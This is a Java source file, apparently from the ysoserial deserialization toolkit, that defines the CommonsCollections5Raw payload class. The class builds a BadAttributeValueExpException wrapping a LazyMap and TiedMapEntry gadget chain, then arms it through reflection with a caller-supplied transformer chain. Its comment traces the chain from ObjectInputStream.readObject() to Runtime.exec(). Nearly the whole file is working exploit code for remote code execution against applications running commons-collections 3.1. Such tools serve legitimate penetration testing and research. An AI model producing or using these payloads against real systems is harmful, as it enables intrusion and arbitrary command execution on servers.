package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/*
	Gadget chain:	
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()				
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()										
	
	Requires:
		commons-collections
 */
@PayloadTest(skip="need more robust way to detect Runtime.exec() without SecurityManager()")
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CommonsCollections5Raw extends PayloadRunner implements ObjectPayloadRaw<BadAttributeValueExpException> {
	
	public BadAttributeValueExpException getObject(final Object command) throws Exception {
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
		        new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = (Transformer[]) command;

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
		
		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Field valfield = val.getClass().getDeclaredField("val");
		valfield.setAccessible(true);
		valfield.set(val, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return val;
	}
}
